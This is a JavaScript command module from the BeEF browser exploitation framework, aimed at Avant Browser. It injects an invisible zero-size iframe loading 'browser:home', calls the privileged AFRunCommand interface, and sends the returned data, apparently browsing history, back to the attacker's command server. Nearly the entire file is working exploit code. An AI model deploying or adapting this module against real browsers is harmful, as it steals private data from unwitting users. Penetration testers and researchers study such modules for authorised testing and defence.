//
//   Copyright (c) 2006-2014 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	if (!beef.browser.isA()) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Exploit failed. Target browser is not Avant Browser.");
		return;
	}

	var avant_iframe = document.createElement("iframe");
	//var avant_iframe = beef.dom.createInvisibleIframe();
	avant_iframe.setAttribute('src',      'browser:home');
	avant_iframe.setAttribute('name',     'avant_history_<%= @command_id %>');
	avant_iframe.setAttribute('width',    '0');
	avant_iframe.setAttribute('heigth',   '0');
	avant_iframe.setAttribute('scrolling','no');
	avant_iframe.setAttribute('style',    'display:none');

	document.body.appendChild(avant_iframe);

	var vstr = {value: ""};

	if (window['avant_history_<%= @command_id %>'].navigator) {
		//This works if FF is the rendering engine
		window['avant_history_<%= @command_id %>'].navigator.AFRunCommand(<%= @cId %>, vstr);
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+vstr.value);
	} else {
		// this works if Chrome is the rendering engine
		//window['avant_history_<%= @command_id %>'].AFRunCommand(60003, vstr);
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Exploit failed. Rendering engine is not set to Firefox.");
	}

});

